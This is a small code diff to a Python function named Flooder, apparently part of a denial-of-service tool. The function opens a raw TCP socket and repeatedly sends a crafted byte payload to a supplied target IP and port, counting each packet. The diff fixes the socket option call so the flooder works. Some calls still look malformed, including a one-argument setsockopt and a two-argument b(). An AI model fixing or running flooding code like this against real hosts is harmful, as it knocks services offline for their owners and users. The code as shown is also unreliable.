@@ -48,7 +48,7 @@ def Flooder(**pHu):
     global count
     try:
         sVar = socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_TCP)
-        socket.setsockopt(socket.TCP_NODELAY)
+        sVar.setsockopt(socket.TCP_NODELAY)
         z3Payload = b("\x02\x04\x05\xb4\x04\x02\x08\x0a\x00\xd9\x68\xa3\x00\x00\x00\x00\x01\x03\x03\x07\xfe\x04\xf9\x89", 24)
         sendByte = sVar.sendto(z3Payload, (pHu['host_ip'],pHu['port']))
         count+=1
